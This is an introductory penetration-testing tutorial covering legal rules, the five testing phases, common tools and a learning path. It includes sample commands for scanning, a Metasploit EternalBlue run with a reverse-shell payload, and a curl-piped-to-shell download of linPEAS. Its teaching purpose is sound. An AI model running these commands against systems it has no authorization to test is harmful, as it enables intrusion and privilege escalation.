Introduction to Penetration Testing: A Beginner's Guide

📅 Jan 15, 2024 ⏱ 8 min read
#beginner #pentest #methodology #kali-linux

What is Penetration Testing?

Penetration testing — often called pentesting or ethical hacking — is the practice of intentionally attacking a computer system, network, or web application with the owner's explicit permission, in order to discover security vulnerabilities before malicious actors do. Think of it as hiring a professional locksmith to try to break into your own house so you can find out which locks are weak.

Unlike malicious hacking, penetration testing is a controlled, scoped, and documented exercise. The goal is not to cause harm but to produce a detailed report of weaknesses and recommendations to remediate them. Organizations of all sizes — from startups to government agencies — use penetration testers to comply with security standards such as PCI-DSS, HIPAA, ISO 27001, and SOC 2.

Pentesting sits at the intersection of computer networking, programming, psychology, and creativity. A good pentester doesn't just run automated scanners — they think like an attacker, chaining small weaknesses together into a full compromise path.

Legal and Ethical Framework

Before you touch a single port, you must understand the legal landscape. Unauthorized access to computer systems is a criminal offence in virtually every jurisdiction — including the Computer Fraud and Abuse Act (CFAA) in the United States, the Computer Misuse Act 1990 in the United Kingdom, and equivalent legislation worldwide.

Golden Rule: Never test a system you do not own or do not have explicit, written authorization to test. "It was on the internet" is not permission.

A professional engagement always begins with a Rules of Engagement (RoE) document and a signed Statement of Work (SoW) that defines:

  • The exact scope — IP ranges, domains, and applications in-scope vs. out-of-scope.
  • The testing window — when testing is permitted (often business hours, sometimes 24/7).
  • Emergency contact details in case something goes wrong.
  • Any techniques explicitly forbidden (e.g., DoS attacks, social engineering of employees).
  • Data handling procedures for any sensitive information discovered.

If you are learning and want to practice legally, use dedicated lab environments such as Hack The Box, TryHackMe, VulnHub, or your own isolated virtual-machine network.

The Five Phases of Penetration Testing

Most penetration testing methodologies — including PTES (Penetration Testing Execution Standard) and OWASP Testing Guide — organize work into five distinct phases. Understanding each phase gives you a repeatable, professional framework rather than a haphazard approach.

Phase 1 — Reconnaissance

Reconnaissance (recon) is the intelligence-gathering phase. The goal is to collect as much information as possible about the target without triggering alerts. Recon is typically split into two categories:

  • Passive recon — gathering information from publicly available sources (OSINT) without directly interacting with the target. Tools: theHarvester, Maltego, Shodan, WHOIS lookups, LinkedIn, Google Dorks.
  • Active recon — directly probing the target to enumerate hosts, ports, and services. This leaves traces in logs. Tools: nmap, masscan, ping, DNS zone transfers.

A classic Google Dork example to find exposed login panels:

# Google Dork — find exposed admin login pages on a target domain
site:example.com inurl:admin intitle:"login"

# theHarvester — gather emails and subdomains from public sources
theHarvester -d example.com -b google,bing,linkedin -l 500

# DNS subdomain enumeration with amass
amass enum -passive -d example.com -o subdomains.txt

Phase 2 — Scanning & Enumeration

Once you have a list of targets, the scanning phase maps out exactly what is running — open ports, services, software versions, and operating systems. Nmap is the industry-standard tool for this.

# Basic ping sweep — discover live hosts on a subnet
nmap -sn 192.168.1.0/24

# Full TCP SYN scan with service/version detection and OS fingerprinting
nmap -sS -sV -O -A -T4 192.168.1.105

# Scan all 65535 ports, then run default scripts on open ones
nmap -p- --open -sV --script=default 192.168.1.105 -oN scan_results.txt

# UDP scan for common ports (slower — run selectively)
nmap -sU -p 53,67,68,69,123,161,500 192.168.1.105

# NSE script — enumerate SMB shares
nmap --script smb-enum-shares,smb-enum-users -p 445 192.168.1.105

After port scanning, enumeration digs deeper into each service. For a web server you might run nikto and gobuster to find hidden directories; for SMB you might use enum4linux; for databases you might try sqlmap against injectable parameters.

Phase 3 — Exploitation

Exploitation is the phase most people picture when they think of hacking. Armed with a map of services and their versions, you attempt to leverage known vulnerabilities or misconfigurations to gain unauthorized access. This is where Metasploit Framework shines.

# Launch Metasploit console
msfconsole

# Search for exploits related to a specific CVE or service
msf6 > search type:exploit name:eternalblue
msf6 > search cve:2021-44228  # Log4Shell

# Use a module, configure it, and run
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.105
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > run

Not every vulnerability requires Metasploit. Common manual exploitation techniques include:

  • SQL Injection — manipulating database queries via unsanitized user input.
  • Cross-Site Scripting (XSS) — injecting JavaScript into pages viewed by other users.
  • Command Injection — inserting OS commands into application inputs.
  • Default Credentials — trying vendor default username/password pairs on services like routers, cameras, and admin panels.
  • Broken Authentication — exploiting weak session tokens, missing MFA, or insecure password reset flows.

For web application testing, Burp Suite (Community or Pro) is the essential intercepting proxy. It lets you capture, modify, and replay HTTP/S requests in real time, making it invaluable for manual testing of OWASP Top 10 vulnerabilities.

Phase 4 — Post-Exploitation

Gaining initial access is only the beginning. Post-exploitation simulates what a real attacker would do after establishing a foothold: escalate privileges, move laterally through the network, maintain persistence, and exfiltrate data. This phase demonstrates the true business impact of a vulnerability — it is the difference between "we found a low-severity information disclosure" and "an attacker could have taken over your entire domain."

Key post-exploitation activities include:

  • Privilege Escalation — moving from a low-privilege user to Administrator or root. Tools: winPEAS, linPEAS, BeRoot, sudo -l checks.
  • Lateral Movement — pivoting to other systems using harvested credentials or tokens (Pass-the-Hash, Pass-the-Ticket).
  • Persistence — installing backdoors, scheduled tasks, or registry run keys to survive reboots.
  • Credential Dumping — extracting password hashes from memory (Mimikatz) or disk (/etc/shadow).
  • Data Exfiltration Simulation — demonstrating that sensitive data could have been copied out.
# Linux privilege escalation — check sudo rights
sudo -l

# Find SUID binaries that may be exploitable
find / -perm -4000 -type f 2>/dev/null

# Run linPEAS for automated Linux privilege escalation checks
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# In a Meterpreter session — attempt automated privilege escalation
meterpreter > getsystem
meterpreter > getuid
meterpreter > run post/multi/recon/local_exploit_suggester

Phase 5 — Reporting

The report is the most important deliverable of any engagement. A technically brilliant pentest is worthless if the client cannot understand the findings or act on them. A professional report contains:

  • Executive Summary — a non-technical overview of the engagement outcome, overall risk rating, and top priorities. Written for C-suite and board-level readers.
  • Scope & Methodology — what was tested, what was excluded, and which methodology/standards were followed.
  • Findings — each vulnerability documented with: title, severity rating (Critical / High / Medium / Low / Informational), CVSS score, affected asset, detailed description, evidence (screenshots, command output), business impact, and remediation recommendation.
  • Remediation Roadmap — a prioritized list of fixes, often grouped by effort and impact.
  • Appendices — raw scan output, tool configurations, and any proof-of-concept code.

Severity is typically scored using the Common Vulnerability Scoring System (CVSS v3.1), which considers factors like attack vector, complexity, required privileges, user interaction, and impact on confidentiality, integrity, and availability.

Essential Tools for Beginners

The security community has built an enormous ecosystem of open-source tools. Here is a curated starter kit organized by category:

Operating Systems

  • Kali Linux — the de facto standard pentesting distribution, maintained by Offensive Security. Comes pre-loaded with 600+ tools.
  • Parrot OS — a lightweight Debian-based alternative with a focus on privacy and development.
  • BlackArch Linux — Arch-based with 2800+ security tools in its repository.

Scanning & Enumeration

  • Nmap — network discovery and port scanning.
  • Masscan — extremely fast port scanner (scans the entire internet in ~6 minutes).
  • Gobuster / ffuf — directory and file brute-forcing for web applications.
  • Nikto — web server vulnerability scanner.
  • Enum4linux — SMB/Samba enumeration on Windows/Linux targets.

Exploitation Frameworks

  • Metasploit Framework — the world's most widely used exploitation framework with thousands of modules.
  • Burp Suite — web application security testing proxy.
  • sqlmap — automated SQL injection detection and exploitation.
  • Impacket — a collection of Python scripts for interacting with Windows network protocols.

Password & Credential Tools

  • Hashcat — GPU-accelerated offline password hash cracking.
  • John the Ripper — versatile CPU-based password cracker.
  • Hydra — online brute-force tool for services like SSH, FTP, HTTP forms, and RDP.
  • CrackMapExec — Swiss army knife for Active Directory pentesting.

Types of Penetration Tests

Penetration tests are commonly categorized by the level of information given to the tester:

  • Black-Box — The tester has zero prior knowledge of the target, simulating an external attacker. Realistic but time-consuming.
  • White-Box — Full knowledge is provided: source code, architecture diagrams, credentials. Allows deep analysis in less time. Also called a crystal-box test.
  • Grey-Box — Partial information (e.g., a standard user account) simulates an insider threat or a compromised employee. The most common real-world engagement type.

Tests can also be categorized by target type: network pentesting, web application pentesting, mobile application pentesting, wireless pentesting, social engineering, and physical security assessments.

Getting Started: Your Learning Path

If you are brand new to penetration testing, the journey can feel overwhelming. Here is a structured path to build solid fundamentals:

  1. Learn the foundations — TCP/IP networking, the OSI model, HTTP/S, DNS, common protocols (SSH, SMB, FTP, SMTP). CompTIA Network+ is a solid certification baseline.
  2. Get comfortable with Linux — Most pentesting tools run on Linux. Practice the command line daily. Learn bash scripting basics.
  3. Set up a home lab — Install VirtualBox or VMware, download Kali Linux, and spin up vulnerable machines from VulnHub (e.g., Mr. Robot, Basic Pentesting, DC series).
  4. Practice on guided platforms — TryHackMe offers structured learning paths for beginners. Hack The Box has a huge library of realistic machines. Both are legal sandboxes designed exactly for this.
  5. Study for certifications — The industry-recognized path often goes: CompTIA Security+ → eJPT (eLearnSecurity Junior Penetration Tester) → OSCP (Offensive Security Certified Professional). OSCP is the gold standard for entry-level professional pentesters.
  6. Read, write, and share — Read CVE advisories, follow bug bounty write-ups on HackerOne and Bugcrowd, write your own CTF write-ups. The security community thrives on shared knowledge.
Remember: Becoming a skilled penetration tester takes time. Focus on understanding why exploits work, not just running tools. The best pentesters are problem-solvers who can adapt when automated tools fail.

Conclusion

Penetration testing is one of the most exciting and impactful careers in cybersecurity. By thinking like an attacker, you directly help organizations protect themselves from real threats. The field rewards curiosity, continuous learning, and creative thinking above all else.
